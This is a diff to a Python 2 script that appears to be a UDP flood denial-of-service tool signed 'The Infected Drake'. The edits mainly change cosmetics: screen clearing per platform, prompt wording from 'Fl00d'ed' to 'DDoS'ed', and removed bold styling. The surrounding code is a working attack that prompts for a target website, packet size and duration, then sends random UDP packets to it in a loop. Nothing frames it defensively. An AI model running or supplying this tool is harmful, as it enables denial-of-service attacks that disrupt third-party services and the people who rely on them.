@@ -6,7 +6,12 @@ import os
 
 from time import sleep
 
-os.system("clear")
+if sys.platform == "linux2":
+	os.system("clear")
+elif sys.platform == "win32":
+	os.system("cls")
+else:
+	os.system("clear")
 ###############################
 class color:
    PURPLE = '\033[95m'
@@ -64,24 +69,24 @@ def UDoS():
 	time.sleep(0.1)
 	print ''
 	print ''
-	target = raw_input(color.PURPLE + color.BOLD +"                      Target (Enter website address to be Fl00d'ed):> ")
+	target = raw_input(color.PURPLE + color.BOLD +"                          Target (Enter website address to be DDoS'ed):> ")
        	host_ip=socket.gethostbyname(target)
 	print(color.RED + "                                         Target set ---> %s " % (target))
-	print(color.BOLD+"                  +=====================================================================+")
+	print("                  +=====================================================================+")
 	time.sleep(0.3)
 	print ""
-	package = input(color.BLUE + color.BOLD +"                                     Packet Size (MAX 65507): ")
+	package = input(color.BLUE + color.BOLD +"                                         Size (MAX 65507): ")
 	print(color.RED + "                      Target to be attacked with packets of data --->  %s" % (package))
-	print(color.BOLD+"                  +=====================================================================+")
+	print("                  +=====================================================================+")
 	time.sleep(0.3)
 	print ""
-	duration = input(color.GREEN + color.BOLD +"                                      Duration (0 is infinite): ")
-	print(color.RED + "                                  Time duration of the attack ---> %s " % (duration) + color.END)
+	duration = input(color.GREEN + color.BOLD +"                                   Duration (0 is infinite): ")
+	print(color.RED + "                            Time duration of the attack ---> %s " % (duration) + color.END)
 	durclock = (lambda:0, time.clock)[duration > 0]
 	duration = (1, (durclock() + duration))[duration > 0]
 	packet = random._urandom(package)
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	print(""+R+color.BOLD+"                  +=====================================================================+")
+	print("                  +=====================================================================+")
 	print ""
 	print("               The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
 	while True:
@@ -91,12 +96,12 @@ def UDoS():
 	                sock.sendto(packet, (target, port))
 	        else:
 	                break
-	print color.YELLOW + color.BOLD+"                  +=====================================================================+" + color.END
-	print ""+M+color.BOLD+"                        The UDP flood has completed on %s for %s seconds." % (target, duration)
+	print color.YELLOW + "                  +=====================================================================+" + color.END
+	print ""+M+"                        The UDP flood has completed on %s for %s seconds." % (target, duration)
 	time.sleep(0.3)
-	print color.RED +color.BOLD+"                               This is normal simple DoS attack at the UDP level..."
+	print color.RED +"                               This is normal simple DoS attack at the UDP level..."
 	time.sleep(0.3)
-	print color.CYAN + color.BOLD+"                                     << Remember The Infected Drake (TID) >>"
+	print color.CYAN + "                                     << Remember The Infected Drake (TID) >>"
 	time.sleep(0.3)
-	print color.PURPLE + color.BOLD+"                                         Shutting down ... Goodbye ^_^ "
-	print color.YELLOW + color.BOLD+"             +==============================================================================+" + color.END
+	print color.PURPLE + "                                         Shutting down ... Goodbye ^_^ "
+	print color.YELLOW + "             +==============================================================================+" + color.END
